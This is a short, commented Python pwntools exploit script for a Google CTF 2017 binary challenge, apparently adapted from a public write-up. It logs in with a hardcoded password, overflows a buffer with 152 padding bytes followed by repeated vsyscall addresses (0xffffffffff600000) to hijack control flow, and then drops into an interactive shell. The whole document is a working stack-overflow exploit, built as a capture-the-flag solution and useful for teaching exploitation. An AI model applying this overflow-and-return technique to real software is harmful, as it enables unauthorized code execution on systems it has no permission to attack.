#This exploit is based off of: https://github.com/Caesurus/CTF_Writeups/tree/master/2017-GoogleCTF_Quals/wiki

#First import pwntools
from pwn import *

#Establish the target
target = process('./challenge')
#gdb.attach(target)

#Specify the user command and correct file, to specify the file contents for the PASS function 
target.sendline('USER')
target.sendline('1MB@tMaN')

#Send the PASS command to enter the PASS function
target.sendline('PASS')

#Construct the payload to overflow the buffer and reach the return address, and 0xffffffffff600000 vsyscall to reach the INIT function
payload = "0"*152 + p64(0xffffffffff600000)*23

#Send the payload
target.sendline(payload)

#Send 8 null bytes to pass the two remaining checks to the system function
finish = "\x00"*8

#Send the last 8 bytes
target.sendline(finish)

#Drop to an interactive shell to get the flag
target.interactive()